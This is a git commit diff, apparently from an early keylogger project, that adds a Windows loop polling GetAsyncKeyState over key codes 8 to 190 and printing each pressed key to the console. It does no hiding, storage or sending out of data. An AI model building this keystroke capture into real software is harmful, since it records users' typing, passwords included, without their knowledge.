4af5ab991705aafeb8cba685cc2094c353ca41b1
ExploitEngineer <abdulrafayofficial.work@gmail.com>
2026-06-06 11:13:38 +0500

    feat: add windows API to capture the keys

--- src/main.cpp
+++ src/main.cpp
@@ -1,6 +1,18 @@
 #include "logger.hpp"
+#include <iostream>
+#include <windows.h>
+
+using namespace std;
 
 int main() {
-  log("Starting the log...\n");
+  while (true) {
+    // every key on the keyboard has a number called index
+    // 65 = A
+    for (int key = 8; key <= 190; key++) {
+      if (GetAsyncKeyState(key) & 0x0001) {
+        cout << "Key pressed: " << key;
+      }
+    }
+  }
   return 0;
 }
